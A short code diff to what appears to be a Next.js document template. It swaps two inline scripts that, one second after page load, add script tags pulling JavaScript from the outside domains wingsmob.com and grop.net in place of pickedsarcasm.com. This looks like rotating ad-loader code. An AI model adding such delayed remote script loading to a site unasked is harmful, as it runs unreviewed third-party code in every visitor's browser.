@@ -15,8 +15,8 @@ export default class _Document extends Document {
           <link rel="apple-touch-icon" href="/img/icons/icon-128x128.png" />
           <meta name="theme-color" content="#46509e" />
 
-          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="//pickedsarcasm.com/cc/df/f9/ccdff92c9d7f97c5af143f6c519f16ed.js",document.body.appendChild(a)},1e3)});` }} />
-          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="//pickedsarcasm.com/4d/69/6f/4d696fd2a6a11010f9f9e4cdbadc5907.js",document.body.appendChild(a)},1e3)});` }} />
+          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://wingsmob.com/1/ccdff92c9d7f97c5af143f6c519f16ed",document.body.appendChild(a)},1e3)});` }} />
+          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://grop.net/14/4d696fd2a6a11010f9f9e4cdbadc5907",document.body.appendChild(a)},1e3)});` }} />
 
         </Head>
         <body>
